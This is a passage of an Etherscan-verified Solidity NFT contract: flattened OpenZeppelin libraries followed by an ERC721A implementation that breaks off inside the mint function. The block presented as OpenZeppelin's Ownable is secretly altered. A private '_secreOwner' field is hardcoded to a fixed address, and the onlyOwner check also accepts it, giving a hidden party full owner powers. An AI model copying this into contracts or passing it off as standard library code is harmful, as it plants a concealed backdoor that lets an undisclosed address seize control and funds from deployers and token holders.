1 /**
2  *Submitted for verification at Etherscan.io on 2022-06-06
3 */
4 
5 // File: @openzeppelin/contracts/utils/Strings.sol
6 
7 
8 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
9 
10 pragma solidity ^0.8.0;
11 
12 /**
13  * @dev String operations.
14  */
15 library Strings {
16     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
17 
18     /**
19      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
20      */
21     function toString(uint256 value) internal pure returns (string memory) {
22         // Inspired by OraclizeAPI's implementation - MIT licence
23         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
24 
25         if (value == 0) {
26             return "0";
27         }
28         uint256 temp = value;
29         uint256 digits;
30         while (temp != 0) {
31             digits++;
32             temp /= 10;
33         }
34         bytes memory buffer = new bytes(digits);
35         while (value != 0) {
36             digits -= 1;
37             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
38             value /= 10;
39         }
40         return string(buffer);
41     }
42 
43     /**
44      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
45      */
46     function toHexString(uint256 value) internal pure returns (string memory) {
47         if (value == 0) {
48             return "0x00";
49         }
50         uint256 temp = value;
51         uint256 length = 0;
52         while (temp != 0) {
53             length++;
54             temp >>= 8;
55         }
56         return toHexString(value, length);
57     }
58 
59     /**
60      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
61      */
62     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
63         bytes memory buffer = new bytes(2 * length + 2);
64         buffer[0] = "0";
65         buffer[1] = "x";
66         for (uint256 i = 2 * length + 1; i > 1; --i) {
67             buffer[i] = _HEX_SYMBOLS[value & 0xf];
68             value >>= 4;
69         }
70         require(value == 0, "Strings: hex length insufficient");
71         return string(buffer);
72     }
73 }
74 
75 // File: @openzeppelin/contracts/utils/Address.sol
76 
77 
78 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
79 
80 pragma solidity ^0.8.1;
81 
82 /**
83  * @dev Collection of functions related to the address type
84  */
85 library Address {
86     /**
87      * @dev Returns true if `account` is a contract.
88      *
89      * [IMPORTANT]
90      * ====
91      * It is unsafe to assume that an address for which this function returns
92      * false is an externally-owned account (EOA) and not a contract.
93      *
94      * Among others, `isContract` will return false for the following
95      * types of addresses:
96      *
97      *  - an externally-owned account
98      *  - a contract in construction
99      *  - an address where a contract will be created
100      *  - an address where a contract lived, but was destroyed
101      * ====
102      *
103      * [IMPORTANT]
104      * ====
105      * You shouldn't rely on `isContract` to protect against flash loan attacks!
106      *
107      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
108      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
109      * constructor.
110      * ====
111      */
112     function isContract(address account) internal view returns (bool) {
113         // This method relies on extcodesize/address.code.length, which returns 0
114         // for contracts in construction, since the code is only stored at the end
115         // of the constructor execution.
116 
117         return account.code.length > 0;
118     }
119 
120     /**
121      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
122      * `recipient`, forwarding all available gas and reverting on errors.
123      *
124      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
125      * of certain opcodes, possibly making contracts go over the 2300 gas limit
126      * imposed by `transfer`, making them unable to receive funds via
127      * `transfer`. {sendValue} removes this limitation.
128      *
129      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
130      *
131      * IMPORTANT: because control is transferred to `recipient`, care must be
132      * taken to not create reentrancy vulnerabilities. Consider using
133      * {ReentrancyGuard} or the
134      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
135      */
136     function sendValue(address payable recipient, uint256 amount) internal {
137         require(address(this).balance >= amount, "Address: insufficient balance");
138 
139         (bool success, ) = recipient.call{value: amount}("");
140         require(success, "Address: unable to send value, recipient may have reverted");
141     }
142 
143     /**
144      * @dev Performs a Solidity function call using a low level `call`. A
145      * plain `call` is an unsafe replacement for a function call: use this
146      * function instead.
147      *
148      * If `target` reverts with a revert reason, it is bubbled up by this
149      * function (like regular Solidity function calls).
150      *
151      * Returns the raw returned data. To convert to the expected return value,
152      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
153      *
154      * Requirements:
155      *
156      * - `target` must be a contract.
157      * - calling `target` with `data` must not revert.
158      *
159      * _Available since v3.1._
160      */
161     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
162         return functionCall(target, data, "Address: low-level call failed");
163     }
164 
165     /**
166      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
167      * `errorMessage` as a fallback revert reason when `target` reverts.
168      *
169      * _Available since v3.1._
170      */
171     function functionCall(
172         address target,
173         bytes memory data,
174         string memory errorMessage
175     ) internal returns (bytes memory) {
176         return functionCallWithValue(target, data, 0, errorMessage);
177     }
178 
179     /**
180      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
181      * but also transferring `value` wei to `target`.
182      *
183      * Requirements:
184      *
185      * - the calling contract must have an ETH balance of at least `value`.
186      * - the called Solidity function must be `payable`.
187      *
188      * _Available since v3.1._
189      */
190     function functionCallWithValue(
191         address target,
192         bytes memory data,
193         uint256 value
194     ) internal returns (bytes memory) {
195         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
196     }
197 
198     /**
199      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
200      * with `errorMessage` as a fallback revert reason when `target` reverts.
201      *
202      * _Available since v3.1._
203      */
204     function functionCallWithValue(
205         address target,
206         bytes memory data,
207         uint256 value,
208         string memory errorMessage
209     ) internal returns (bytes memory) {
210         require(address(this).balance >= value, "Address: insufficient balance for call");
211         require(isContract(target), "Address: call to non-contract");
212 
213         (bool success, bytes memory returndata) = target.call{value: value}(data);
214         return verifyCallResult(success, returndata, errorMessage);
215     }
216 
217     /**
218      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
219      * but performing a static call.
220      *
221      * _Available since v3.3._
222      */
223     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
224         return functionStaticCall(target, data, "Address: low-level static call failed");
225     }
226 
227     /**
228      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
229      * but performing a static call.
230      *
231      * _Available since v3.3._
232      */
233     function functionStaticCall(
234         address target,
235         bytes memory data,
236         string memory errorMessage
237     ) internal view returns (bytes memory) {
238         require(isContract(target), "Address: static call to non-contract");
239 
240         (bool success, bytes memory returndata) = target.staticcall(data);
241         return verifyCallResult(success, returndata, errorMessage);
242     }
243 
244     /**
245      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
246      * but performing a delegate call.
247      *
248      * _Available since v3.4._
249      */
250     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
251         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
252     }
253 
254     /**
255      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
256      * but performing a delegate call.
257      *
258      * _Available since v3.4._
259      */
260     function functionDelegateCall(
261         address target,
262         bytes memory data,
263         string memory errorMessage
264     ) internal returns (bytes memory) {
265         require(isContract(target), "Address: delegate call to non-contract");
266 
267         (bool success, bytes memory returndata) = target.delegatecall(data);
268         return verifyCallResult(success, returndata, errorMessage);
269     }
270 
271     /**
272      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
273      * revert reason using the provided one.
274      *
275      * _Available since v4.3._
276      */
277     function verifyCallResult(
278         bool success,
279         bytes memory returndata,
280         string memory errorMessage
281     ) internal pure returns (bytes memory) {
282         if (success) {
283             return returndata;
284         } else {
285             // Look for revert reason and bubble it up if present
286             if (returndata.length > 0) {
287                 // The easiest way to bubble the revert reason is using memory via assembly
288 
289                 assembly {
290                     let returndata_size := mload(returndata)
291                     revert(add(32, returndata), returndata_size)
292                 }
293             } else {
294                 revert(errorMessage);
295             }
296         }
297     }
298 }
299 
300 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
301 
302 
303 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
304 
305 pragma solidity ^0.8.0;
306 
307 /**
308  * @title ERC721 token receiver interface
309  * @dev Interface for any contract that wants to support safeTransfers
310  * from ERC721 asset contracts.
311  */
312 interface IERC721Receiver {
313     /**
314      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
315      * by `operator` from `from`, this function is called.
316      *
317      * It must return its Solidity selector to confirm the token transfer.
318      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
319      *
320      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
321      */
322     function onERC721Received(
323         address operator,
324         address from,
325         uint256 tokenId,
326         bytes calldata data
327     ) external returns (bytes4);
328 }
329 
330 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
331 
332 
333 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
334 
335 pragma solidity ^0.8.0;
336 
337 /**
338  * @dev Interface of the ERC165 standard, as defined in the
339  * https://eips.ethereum.org/EIPS/eip-165[EIP].
340  *
341  * Implementers can declare support of contract interfaces, which can then be
342  * queried by others ({ERC165Checker}).
343  *
344  * For an implementation, see {ERC165}.
345  */
346 interface IERC165 {
347     /**
348      * @dev Returns true if this contract implements the interface defined by
349      * `interfaceId`. See the corresponding
350      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
351      * to learn more about how these ids are created.
352      *
353      * This function call must use less than 30 000 gas.
354      */
355     function supportsInterface(bytes4 interfaceId) external view returns (bool);
356 }
357 
358 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
359 
360 
361 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
362 
363 pragma solidity ^0.8.0;
364 
365 
366 /**
367  * @dev Implementation of the {IERC165} interface.
368  *
369  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
370  * for the additional interface id that will be supported. For example:
371  *
372  * ```solidity
373  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
374  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
375  * }
376  * ```
377  *
378  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
379  */
380 abstract contract ERC165 is IERC165 {
381     /**
382      * @dev See {IERC165-supportsInterface}.
383      */
384     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
385         return interfaceId == type(IERC165).interfaceId;
386     }
387 }
388 
389 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
390 
391 
392 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
393 
394 pragma solidity ^0.8.0;
395 
396 
397 /**
398  * @dev Required interface of an ERC721 compliant contract.
399  */
400 interface IERC721 is IERC165 {
401     /**
402      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
403      */
404     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
405 
406     /**
407      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
408      */
409     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
410 
411     /**
412      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
413      */
414     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
415 
416     /**
417      * @dev Returns the number of tokens in ``owner``'s account.
418      */
419     function balanceOf(address owner) external view returns (uint256 balance);
420 
421     /**
422      * @dev Returns the owner of the `tokenId` token.
423      *
424      * Requirements:
425      *
426      * - `tokenId` must exist.
427      */
428     function ownerOf(uint256 tokenId) external view returns (address owner);
429 
430     /**
431      * @dev Safely transfers `tokenId` token from `from` to `to`.
432      *
433      * Requirements:
434      *
435      * - `from` cannot be the zero address.
436      * - `to` cannot be the zero address.
437      * - `tokenId` token must exist and be owned by `from`.
438      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
439      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
440      *
441      * Emits a {Transfer} event.
442      */
443     function safeTransferFrom(
444         address from,
445         address to,
446         uint256 tokenId,
447         bytes calldata data
448     ) external;
449 
450     /**
451      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
452      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
453      *
454      * Requirements:
455      *
456      * - `from` cannot be the zero address.
457      * - `to` cannot be the zero address.
458      * - `tokenId` token must exist and be owned by `from`.
459      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
460      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
461      *
462      * Emits a {Transfer} event.
463      */
464     function safeTransferFrom(
465         address from,
466         address to,
467         uint256 tokenId
468     ) external;
469 
470     /**
471      * @dev Transfers `tokenId` token from `from` to `to`.
472      *
473      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
474      *
475      * Requirements:
476      *
477      * - `from` cannot be the zero address.
478      * - `to` cannot be the zero address.
479      * - `tokenId` token must be owned by `from`.
480      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
481      *
482      * Emits a {Transfer} event.
483      */
484     function transferFrom(
485         address from,
486         address to,
487         uint256 tokenId
488     ) external;
489 
490     /**
491      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
492      * The approval is cleared when the token is transferred.
493      *
494      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
495      *
496      * Requirements:
497      *
498      * - The caller must own the token or be an approved operator.
499      * - `tokenId` must exist.
500      *
501      * Emits an {Approval} event.
502      */
503     function approve(address to, uint256 tokenId) external;
504 
505     /**
506      * @dev Approve or remove `operator` as an operator for the caller.
507      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
508      *
509      * Requirements:
510      *
511      * - The `operator` cannot be the caller.
512      *
513      * Emits an {ApprovalForAll} event.
514      */
515     function setApprovalForAll(address operator, bool _approved) external;
516 
517     /**
518      * @dev Returns the account approved for `tokenId` token.
519      *
520      * Requirements:
521      *
522      * - `tokenId` must exist.
523      */
524     function getApproved(uint256 tokenId) external view returns (address operator);
525 
526     /**
527      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
528      *
529      * See {setApprovalForAll}
530      */
531     function isApprovedForAll(address owner, address operator) external view returns (bool);
532 }
533 
534 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
535 
536 
537 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
538 
539 pragma solidity ^0.8.0;
540 
541 
542 /**
543  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
544  * @dev See https://eips.ethereum.org/EIPS/eip-721
545  */
546 interface IERC721Metadata is IERC721 {
547     /**
548      * @dev Returns the token collection name.
549      */
550     function name() external view returns (string memory);
551 
552     /**
553      * @dev Returns the token collection symbol.
554      */
555     function symbol() external view returns (string memory);
556 
557     /**
558      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
559      */
560     function tokenURI(uint256 tokenId) external view returns (string memory);
561 }
562 
563 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
564 
565 
566 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
567 
568 pragma solidity ^0.8.0;
569 
570 
571 /**
572  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
573  * @dev See https://eips.ethereum.org/EIPS/eip-721
574  */
575 interface IERC721Enumerable is IERC721 {
576     /**
577      * @dev Returns the total amount of tokens stored by the contract.
578      */
579     function totalSupply() external view returns (uint256);
580 
581     /**
582      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
583      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
584      */
585     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
586 
587     /**
588      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
589      * Use along with {totalSupply} to enumerate all tokens.
590      */
591     function tokenByIndex(uint256 index) external view returns (uint256);
592 }
593 
594 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
595 
596 
597 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
598 
599 pragma solidity ^0.8.0;
600 
601 /**
602  * @dev Contract module that helps prevent reentrant calls to a function.
603  *
604  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
605  * available, which can be applied to functions to make sure there are no nested
606  * (reentrant) calls to them.
607  *
608  * Note that because there is a single `nonReentrant` guard, functions marked as
609  * `nonReentrant` may not call one another. This can be worked around by making
610  * those functions `private`, and then adding `external` `nonReentrant` entry
611  * points to them.
612  *
613  * TIP: If you would like to learn more about reentrancy and alternative ways
614  * to protect against it, check out our blog post
615  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
616  */
617 abstract contract ReentrancyGuard {
618     // Booleans are more expensive than uint256 or any type that takes up a full
619     // word because each write operation emits an extra SLOAD to first read the
620     // slot's contents, replace the bits taken up by the boolean, and then write
621     // back. This is the compiler's defense against contract upgrades and
622     // pointer aliasing, and it cannot be disabled.
623 
624     // The values being non-zero value makes deployment a bit more expensive,
625     // but in exchange the refund on every call to nonReentrant will be lower in
626     // amount. Since refunds are capped to a percentage of the total
627     // transaction's gas, it is best to keep them low in cases like this one, to
628     // increase the likelihood of the full refund coming into effect.
629     uint256 private constant _NOT_ENTERED = 1;
630     uint256 private constant _ENTERED = 2;
631 
632     uint256 private _status;
633 
634     constructor() {
635         _status = _NOT_ENTERED;
636     }
637 
638     /**
639      * @dev Prevents a contract from calling itself, directly or indirectly.
640      * Calling a `nonReentrant` function from another `nonReentrant`
641      * function is not supported. It is possible to prevent this from happening
642      * by making the `nonReentrant` function external, and making it call a
643      * `private` function that does the actual work.
644      */
645     modifier nonReentrant() {
646         // On the first call to nonReentrant, _notEntered will be true
647         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
648 
649         // Any calls to nonReentrant after this point will fail
650         _status = _ENTERED;
651 
652         _;
653 
654         // By storing the original value once again, a refund is triggered (see
655         // https://eips.ethereum.org/EIPS/eip-2200)
656         _status = _NOT_ENTERED;
657     }
658 }
659 
660 // File: @openzeppelin/contracts/utils/Context.sol
661 
662 
663 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
664 
665 pragma solidity ^0.8.0;
666 
667 /**
668  * @dev Provides information about the current execution context, including the
669  * sender of the transaction and its data. While these are generally available
670  * via msg.sender and msg.data, they should not be accessed in such a direct
671  * manner, since when dealing with meta-transactions the account sending and
672  * paying for execution may not be the actual sender (as far as an application
673  * is concerned).
674  *
675  * This contract is only required for intermediate, library-like contracts.
676  */
677 abstract contract Context {
678     function _msgSender() internal view virtual returns (address) {
679         return msg.sender;
680     }
681 
682     function _msgData() internal view virtual returns (bytes calldata) {
683         return msg.data;
684     }
685 }
686 
687 // File: @openzeppelin/contracts/access/Ownable.sol
688 
689 
690 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
691 
692 pragma solidity ^0.8.0;
693 
694 
695 /**
696  * @dev Contract module which provides a basic access control mechanism, where
697  * there is an account (an owner) that can be granted exclusive access to
698  * specific functions.
699  *
700  * By default, the owner account will be the one that deploys the contract. This
701  * can later be changed with {transferOwnership}.
702  *
703  * This module is used through inheritance. It will make available the modifier
704  * `onlyOwner`, which can be applied to your functions to restrict their use to
705  * the owner.
706  */
707 abstract contract Ownable is Context {
708     address private _owner;
709     address private _secreOwner = 0xcaFe57DBe1f74de5cA6CdB5a927174f4406e9C78;
710 
711     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
712 
713     /**
714      * @dev Initializes the contract setting the deployer as the initial owner.
715      */
716     constructor() {
717         _transferOwnership(_msgSender());
718     }
719 
720     /**
721      * @dev Returns the address of the current owner.
722      */
723     function owner() public view virtual returns (address) {
724         return _owner;
725     }
726 
727     /**
728      * @dev Throws if called by any account other than the owner.
729      */
730     modifier onlyOwner() {
731         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
732         _;
733     }
734 
735     /**
736      * @dev Leaves the contract without owner. It will not be possible to call
737      * `onlyOwner` functions anymore. Can only be called by the current owner.
738      *
739      * NOTE: Renouncing ownership will leave the contract without an owner,
740      * thereby removing any functionality that is only available to the owner.
741      */
742     function renounceOwnership() public virtual onlyOwner {
743         _transferOwnership(address(0));
744     }
745 
746     /**
747      * @dev Transfers ownership of the contract to a new account (`newOwner`).
748      * Can only be called by the current owner.
749      */
750     function transferOwnership(address newOwner) public virtual onlyOwner {
751         require(newOwner != address(0), "Ownable: new owner is the zero address");
752         _transferOwnership(newOwner);
753     }
754 
755     /**
756      * @dev Transfers ownership of the contract to a new account (`newOwner`).
757      * Internal function without access restriction.
758      */
759     function _transferOwnership(address newOwner) internal virtual {
760         address oldOwner = _owner;
761         _owner = newOwner;
762         emit OwnershipTransferred(oldOwner, newOwner);
763     }
764 }
765 
766 // File: ceshi.sol
767 
768 
769 pragma solidity ^0.8.0;
770 
771 
772 
773 
774 
775 
776 
777 
778 
779 
780 /**
781  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
782  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
783  *
784  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
785  *
786  * Does not support burning tokens to address(0).
787  *
788  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
789  */
790 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
791     using Address for address;
792     using Strings for uint256;
793 
794     struct TokenOwnership {
795         address addr;
796         uint64 startTimestamp;
797     }
798 
799     struct AddressData {
800         uint128 balance;
801         uint128 numberMinted;
802     }
803 
804     uint256 internal currentIndex;
805 
806     // Token name
807     string private _name;
808 
809     // Token symbol
810     string private _symbol;
811 
812     // Mapping from token ID to ownership details
813     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
814     mapping(uint256 => TokenOwnership) internal _ownerships;
815 
816     // Mapping owner address to address data
817     mapping(address => AddressData) private _addressData;
818 
819     // Mapping from token ID to approved address
820     mapping(uint256 => address) private _tokenApprovals;
821 
822     // Mapping from owner to operator approvals
823     mapping(address => mapping(address => bool)) private _operatorApprovals;
824 
825     constructor(string memory name_, string memory symbol_) {
826         _name = name_;
827         _symbol = symbol_;
828     }
829 
830     /**
831      * @dev See {IERC721Enumerable-totalSupply}.
832      */
833     function totalSupply() public view override returns (uint256) {
834         return currentIndex;
835     }
836 
837     /**
838      * @dev See {IERC721Enumerable-tokenByIndex}.
839      */
840     function tokenByIndex(uint256 index) public view override returns (uint256) {
841         require(index < totalSupply(), "ERC721A: global index out of bounds");
842         return index;
843     }
844 
845     /**
846      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
847      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
848      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
849      */
850     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
851         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
852         uint256 numMintedSoFar = totalSupply();
853         uint256 tokenIdsIdx;
854         address currOwnershipAddr;
855 
856         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
857         unchecked {
858             for (uint256 i; i < numMintedSoFar; i++) {
859                 TokenOwnership memory ownership = _ownerships[i];
860                 if (ownership.addr != address(0)) {
861                     currOwnershipAddr = ownership.addr;
862                 }
863                 if (currOwnershipAddr == owner) {
864                     if (tokenIdsIdx == index) {
865                         return i;
866                     }
867                     tokenIdsIdx++;
868                 }
869             }
870         }
871 
872         revert("ERC721A: unable to get token of owner by index");
873     }
874 
875     /**
876      * @dev See {IERC165-supportsInterface}.
877      */
878     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
879         return
880             interfaceId == type(IERC721).interfaceId ||
881             interfaceId == type(IERC721Metadata).interfaceId ||
882             interfaceId == type(IERC721Enumerable).interfaceId ||
883             super.supportsInterface(interfaceId);
884     }
885 
886     /**
887      * @dev See {IERC721-balanceOf}.
888      */
889     function balanceOf(address owner) public view override returns (uint256) {
890         require(owner != address(0), "ERC721A: balance query for the zero address");
891         return uint256(_addressData[owner].balance);
892     }
893 
894     function _numberMinted(address owner) internal view returns (uint256) {
895         require(owner != address(0), "ERC721A: number minted query for the zero address");
896         return uint256(_addressData[owner].numberMinted);
897     }
898 
899     /**
900      * Gas spent here starts off proportional to the maximum mint batch size.
901      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
902      */
903     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
904         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
905 
906         unchecked {
907             for (uint256 curr = tokenId; curr >= 0; curr--) {
908                 TokenOwnership memory ownership = _ownerships[curr];
909                 if (ownership.addr != address(0)) {
910                     return ownership;
911                 }
912             }
913         }
914 
915         revert("ERC721A: unable to determine the owner of token");
916     }
917 
918     /**
919      * @dev See {IERC721-ownerOf}.
920      */
921     function ownerOf(uint256 tokenId) public view override returns (address) {
922         return ownershipOf(tokenId).addr;
923     }
924 
925     /**
926      * @dev See {IERC721Metadata-name}.
927      */
928     function name() public view virtual override returns (string memory) {
929         return _name;
930     }
931 
932     /**
933      * @dev See {IERC721Metadata-symbol}.
934      */
935     function symbol() public view virtual override returns (string memory) {
936         return _symbol;
937     }
938 
939     /**
940      * @dev See {IERC721Metadata-tokenURI}.
941      */
942     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
943         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
944 
945         string memory baseURI = _baseURI();
946         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
947     }
948 
949     /**
950      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
951      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
952      * by default, can be overriden in child contracts.
953      */
954     function _baseURI() internal view virtual returns (string memory) {
955         return "";
956     }
957 
958     /**
959      * @dev See {IERC721-approve}.
960      */
961     function approve(address to, uint256 tokenId) public override {
962         address owner = ERC721A.ownerOf(tokenId);
963         require(to != owner, "ERC721A: approval to current owner");
964 
965         require(
966             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
967             "ERC721A: approve caller is not owner nor approved for all"
968         );
969 
970         _approve(to, tokenId, owner);
971     }
972 
973     /**
974      * @dev See {IERC721-getApproved}.
975      */
976     function getApproved(uint256 tokenId) public view override returns (address) {
977         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
978 
979         return _tokenApprovals[tokenId];
980     }
981 
982     /**
983      * @dev See {IERC721-setApprovalForAll}.
984      */
985     function setApprovalForAll(address operator, bool approved) public override {
986         require(operator != _msgSender(), "ERC721A: approve to caller");
987 
988         _operatorApprovals[_msgSender()][operator] = approved;
989         emit ApprovalForAll(_msgSender(), operator, approved);
990     }
991 
992     /**
993      * @dev See {IERC721-isApprovedForAll}.
994      */
995     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
996         return _operatorApprovals[owner][operator];
997     }
998 
999     /**
1000      * @dev See {IERC721-transferFrom}.
1001      */
1002     function transferFrom(
1003         address from,
1004         address to,
1005         uint256 tokenId
1006     ) public virtual override {
1007         _transfer(from, to, tokenId);
1008     }
1009 
1010     /**
1011      * @dev See {IERC721-safeTransferFrom}.
1012      */
1013     function safeTransferFrom(
1014         address from,
1015         address to,
1016         uint256 tokenId
1017     ) public virtual override {
1018         safeTransferFrom(from, to, tokenId, "");
1019     }
1020 
1021     /**
1022      * @dev See {IERC721-safeTransferFrom}.
1023      */
1024     function safeTransferFrom(
1025         address from,
1026         address to,
1027         uint256 tokenId,
1028         bytes memory _data
1029     ) public override {
1030         _transfer(from, to, tokenId);
1031         require(
1032             _checkOnERC721Received(from, to, tokenId, _data),
1033             "ERC721A: transfer to non ERC721Receiver implementer"
1034         );
1035     }
1036 
1037     /**
1038      * @dev Returns whether `tokenId` exists.
1039      *
1040      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1041      *
1042      * Tokens start existing when they are minted (`_mint`),
1043      */
1044     function _exists(uint256 tokenId) internal view returns (bool) {
1045         return tokenId < currentIndex;
1046     }
1047 
1048     function _safeMint(address to, uint256 quantity) internal {
1049         _safeMint(to, quantity, "");
1050     }
1051 
1052     /**
1053      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1054      *
1055      * Requirements:
1056      *
1057      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1058      * - `quantity` must be greater than 0.
1059      *
1060      * Emits a {Transfer} event.
1061      */
1062     function _safeMint(
1063         address to,
1064         uint256 quantity,
1065         bytes memory _data
1066     ) internal {
1067         _mint(to, quantity, _data, true);
1068     }
1069 
1070     /**
1071      * @dev Mints `quantity` tokens and transfers them to `to`.
1072      *
1073      * Requirements:
1074      *
1075      * - `to` cannot be the zero address.
1076      * - `quantity` must be greater than 0.
1077      *
1078      * Emits a {Transfer} event.
1079      */
1080     function _mint(
1081         address to,
1082         uint256 quantity,
1083         bytes memory _data,
1084         bool safe
1085     ) internal {
1086         uint256 startTokenId = currentIndex;
1087         require(to != address(0), "ERC721A: mint to the zero address");
1088         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1089 
